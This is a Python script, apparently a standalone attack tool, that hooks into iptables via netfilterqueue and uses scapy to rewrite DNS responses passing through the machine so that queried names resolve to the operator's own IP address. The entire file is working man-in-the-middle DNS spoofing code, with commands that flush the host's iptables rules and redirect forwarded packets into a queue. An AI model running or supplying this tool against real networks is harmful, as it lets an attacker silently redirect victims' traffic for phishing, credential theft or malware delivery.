#!/usr/bin/env python
import time

import netfilterqueue
import subprocess
import scapy.layers.dns
from scapy.layers.inet import IP, UDP
import urls


class DNS_SPOOF:
    def __init__(self, your_ip):
        self.queue = netfilterqueue.NetfilterQueue()
        self.your_ip = your_ip

    def check_url(self, qname):
        for url in urls.url_link:
            if url in qname.decode():
                return True
        return False


    def packet_processing(self, packet):
        scapy_packet = IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.layers.dns.DNSRR):
            qname = scapy_packet[scapy.layers.dns.DNSQR].qname

            if not self.check_url(qname):
                print("[+] Spoofing target...")
                answer = scapy.layers.dns.DNSRR(rrname=qname, rdata=self.your_ip)
                scapy_packet[scapy.layers.dns.DNS].an = answer
                scapy_packet[scapy.layers.dns.DNS].ancount = 1

                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[UDP].len
                del scapy_packet[UDP].chksum

                packet.set_payload(bytes(scapy_packet))
                print(scapy_packet.show())
        packet.accept()

    def run(self):
        print("[+] Clearing configured rules")
        subprocess.call("iptables --flush", shell=True)
        print("[+] Redirecting packets")
        time.sleep(1)
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        self.queue.bind(0, self.packet_processing)
        self.queue.run()

    def stop(self):
        print("[+] Stopping DNS Spoofing")
        time.sleep(1)
        self.queue.unbind()
        subprocess.call("iptables --flush", shell=True)

